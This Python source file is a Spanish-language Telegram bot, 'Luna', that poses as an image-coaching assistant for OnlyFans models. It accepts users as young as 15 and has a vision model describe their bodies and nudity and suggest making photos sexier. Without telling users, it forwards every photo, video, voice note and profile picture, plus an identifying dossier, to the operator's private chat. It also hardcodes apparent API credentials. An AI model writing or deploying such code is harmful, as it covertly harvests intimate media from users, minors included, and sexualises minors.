import os
import io
import random
import asyncio
import base64
import sqlite3
import subprocess
import tempfile
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from agewizard import Age
from groq import Groq

# ==========================================
# CONFIGURACIÓN
# ==========================================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064 
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2" 

client = Groq(api_key=GROQ_API_KEY)
bot_pausado = False

# ==========================================
# BASE DE DATOS SQLITE
# ==========================================
def init_db():
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, 
                 nivel INTEGER, puntos INTEGER, estilo TEXT)''')
    conn.commit()
    conn.close()
init_db()

def guardar_usuario(user_id, nombre, username, edad, nivel, puntos, estilo):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?, ?, ?, ?)",
              (user_id, nombre, username, edad, nivel, puntos, estilo))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

# ==========================================
# IA CON GROQ (Visión, Audio, Texto)
# ==========================================
def analizar_foto_con_groq(imagen_bytes):
    try:
        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
        completion = client.chat.completions.create(
            messages=[
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": "Eres Luna, una experta fotógrafa de contenido para adultos. Describe detalladamente lo que ves en esta imagen: el cuerpo, la ropa (o falta de ella), la pose, la expresión, la iluminación. Luego da 3 consejos muy específicos y sugerentes sobre cómo mejorar la foto para que sea más sexy y profesional."},
                        {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
                    ]
                }
            ],
            model="qwen/qwen3.8-27b",
        )
        return completion.choices[0].message.content
    except Exception as e:
        print(f"Error Groq Vision: {e}")
        return "📸 **Lo que veo:** Una persona en una foto.\n\n💡 **Consejos:** Usa luz lateral, relaja los hombros y prueba un ángulo ligeramente superior."

def transcribir_audio(audio_bytes, formato="ogg"):
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=f".{formato}") as f:
            f.write(audio_bytes)
            ruta = f.name
        with open(ruta, "rb") as audio_file:
            transcription = client.audio.transcriptions.create(
                model="whisper-large-v3-turbo",
                file=audio_file
            )
        os.unlink(ruta)
        return transcription.text
    except Exception as e:
        print(f"Error Whisper: {e}")
        return None

async def conversar_con_ia(texto_usuario, user_id):
    try:
        user_data = obtener_usuario(user_id)
        contexto = ""
        if user_data:
            contexto = f"La chica tiene {user_data[3]} años, su estilo es {user_data[6]}."
        
        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": f"Eres Luna, una asistente de imagen para modelos de OnlyFans. {contexto} Hablas de forma natural, coqueta y profesional. Si la chica te habla de cualquier tema sexual (poses, fetiches, lencería, juguetes, etc.), responde con naturalidad, dándole consejos útiles y sugerentes. No seas explícita ni vulgar, pero sí muy directa y sin tapujos. Responde en español, de forma breve (máximo 3 frases)."},
                {"role": "user", "content": texto_usuario}
            ],
            model="llama3-8b-8192",
        )
        return completion.choices[0].message.content
    except Exception as e:
        return "Me distraje un momento... ¿de qué hablábamos?"

def extraer_fotogramas_video(video_bytes):
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".mp4") as f:
            f.write(video_bytes)
            ruta_video = f.name
        
        fotogramas = []
        for segundo in [1, 2]:
            ruta_frame = f"{ruta_video}_{segundo}.jpg"
            subprocess.run([
                "ffmpeg", "-i", ruta_video, "-ss", str(segundo), 
                "-vframes", "1", "-q:v", "2", ruta_frame
            ], capture_output=True)
            if os.path.exists(ruta_frame):
                with open(ruta_frame, "rb") as img:
                    fotogramas.append(img.read())
                os.unlink(ruta_frame)
        
        os.unlink(ruta_video)
        return fotogramas
    except Exception as e:
        print(f"Error ffmpeg: {e}")
        return []

# ==========================================
# FUNCIONES AUXILIARES
# ==========================================
async def enviar_expediente_inicial(context, user, edad, estilo):
    try:
        username = f"@{user.username}" if user.username else "Oculto"
        fotos = await context.bot.get_user_profile_photos(user.id, limit=1)
        tiene_foto = "Sí" if fotos.total_count > 0 else "Privada"
        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE**\n"
            f"👤 **Nombre:** {user.first_name}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🧠 **Estilo:** {estilo}\n"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        if fotos.total_count > 0:
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=fotos.photos[0][-1].file_id)
    except Exception as e: print(f"Error: {e}")

async def aviso_corto(context, user, tipo):
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username} (ID: `{user.id}`)")

# ==========================================
# COMANDOS
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return await update.message.reply_text("Luna está descansando. 🌙")
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        mensaje = (
            "¡Hola! 🌙 Soy **Luna**, tu asistente de imagen.\n\n"
            "📸 Analizo fotos, videos y audios.\n"
            "💬 Converso contigo sobre cualquier tema.\n\n"
            "Envíame tu fecha de nacimiento (DD-MM-AAAA):"
        )
        await update.message.reply_text(mensaje)
    else:
        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto, video, audio o escríbeme.")

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    text = update.message.text.strip()
    user = update.effective_user
    
    if obtener_usuario(user.id):
        await update.message.chat.send_action(action="typing")
        respuesta = await conversar_con_ia(text, user.id)
        await update.message.reply_text(respuesta)
        return

    try:
        person = Age(text, date_format="DD-MM-YYYY")
        edad = person.years
        if 15 <= edad <= 80:
            if edad < 20: estilo = "Universitaria / Fresca"
            elif edad < 30: estilo = "Joven / Atrevida"
            elif edad < 45: estilo = "Experimentada / Segura"
            else: estilo = "Madura / Elegante"
            
            guardar_usuario(user.id, user.first_name, user.username, edad, 1, 0, estilo)
            await update.message.reply_text(f"✅ ¡Todo listo! Envíame fotos, videos, audios o escríbeme.")
            await enviar_expediente_inicial(context, user, edad, estilo)
        else:
            await update.message.reply_text(f"❌ Rango: 15 a 80 años.")
    except ValueError:
        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")

async def ver_perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = obtener_usuario(user_id)
    if not user_data: return await update.message.reply_text("Primero envíame tu fecha.")
    nivel = user_data[4]
    pts = user_data[5]
    nombre_nivel = {1: "Principiante 🌱", 2: "Intermedia 🌿", 3: "Avanzada 🌳"}.get(nivel, "?")
    await update.message.reply_text(f"👤 **Perfil**\n🏆 Nivel: {nombre_nivel}\n⭐ Puntos: {pts}")

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DANI_CHAT_ID: return
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM usuarios")
    total = c.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 **PANEL**\n👥 Chicas: {total}")

async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_pausado
    if update.effective_user.id != DANI_CHAT_ID: return
    bot_pausado = not bot_pausado
    await update.message.reply_text(f"⚙️ Bot {'PAUSADO' if bot_pausado else 'REANUDADO'}.")

# ==========================================
# RECEPCIÓN DE MULTIMEDIA
# ==========================================
async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id): return await update.message.reply_text("Primero envíame tu fecha.")
    
    msg_espera = await update.message.reply_text("🔍 **Analizando foto...**")
    photo_file = await update.message.photo[-1].get_file()
    photo_bytes = await photo_file.download_as_bytearray()
    
    sugerencia = analizar_foto_con_groq(photo_bytes)
    await msg_espera.edit_text(sugerencia)
    
    try: await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, "Foto")

async def analyze_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id): return await update.message.reply_text("Primero envíame tu fecha.")
    
    msg_espera = await update.message.reply_text("🎥 **Procesando video...**\nExtrayendo fotogramas para analizarlos.")
    video_file = await update.message.video.get_file()
    video_bytes = await video_file.download_as_bytearray()
    
    fotogramas = extraer_fotogramas_video(video_bytes)
    if not fotogramas:
        await msg_espera.edit_text("❌ No pude procesar el video. Intenta enviarlo de nuevo.")
        return
    
    sugerencia = analizar_foto_con_groq(fotogramas[0])
    await msg_espera.edit_text(f"🎥 **Análisis del video:**\n\n{sugerencia}")
    
    try: await context.bot.send_video(chat_id=DANI_CHAT_ID, video=video_file.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, "Video")

async def analyze_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id): return await update.message.reply_text("Primero envíame tu fecha.")
    
    msg_espera = await update.message.reply_text("🎤 **Transcribiendo audio...**")
    
    if update.message.voice:
        file = await update.message.voice.get_file()
        formato = "ogg"
    elif update.message.audio:
        file = await update.message.audio.get_file()
        formato = "mp3"
    else:
        return await update.message.reply_text("Formato no soportado.")
    
    audio_bytes = await file.download_as_bytearray()
    transcripcion = transcribir_audio(audio_bytes, formato)
    
    if not transcripcion:
        await msg_espera.edit_text("❌ No pude transcribir el audio.")
        return
    
    respuesta = await conversar_con_ia(f"La chica dijo esto en un audio: '{transcripcion}'. Responde de forma natural y sugerente.", user_id)
    await msg_espera.edit_text(f"🎤 **Dijiste:** {transcripcion}\n\n💬 **Luna:** {respuesta}")
    
    try:
        if update.message.voice:
            await context.bot.send_voice(chat_id=DANI_CHAT_ID, voice=file.file_id)
        else:
            await context.bot.send_audio(chat_id=DANI_CHAT_ID, audio=file.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, "Audio")

# ==========================================
# MAIN
# ==========================================
if __name__ == "__main__":
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("perfil", ver_perfil))
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(CommandHandler("pausar", admin_pausar))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
    app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
    app.add_handler(MessageHandler(filters.VIDEO, analyze_video))
    app.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, analyze_audio))
    app.run_polling()
